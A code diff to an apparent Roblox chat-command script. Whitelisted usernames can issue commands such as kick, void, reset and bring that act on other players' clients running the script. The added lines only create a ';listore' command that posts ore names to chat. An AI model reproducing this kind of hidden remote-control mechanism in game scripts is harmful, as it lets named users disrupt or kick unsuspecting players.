@@ -3,7 +3,9 @@ local Notify = function(_Title, _Text , Time)
     StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
 end
 local cmds = "⭐cmds are: reset,ac,void,kick,sit,ad,config."
-local cmds2="help,tbring,song,hev,lobby,vclipdown⭐"
+local cmds2="help,tbring,song,hev,lobby,vclipdown,butterfingers,listore⭐"
+local ores = "⭐ores that can be dropped are:"
+local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 local sexlist = {
 	"Real_revvybxnned1",
 	"revsteppinsstand",
@@ -77,6 +79,19 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
 	elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
+
+
+elseif cmd == ";listore" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(ores)
+                wait()
+                textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(ores2)
+
+	elseif cmd == ";listore" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(ores)
+                wait()
+                textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(ores2)
 
 	elseif cmd == ";cmds" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 		local textChatService = game:GetService("TextChatService")
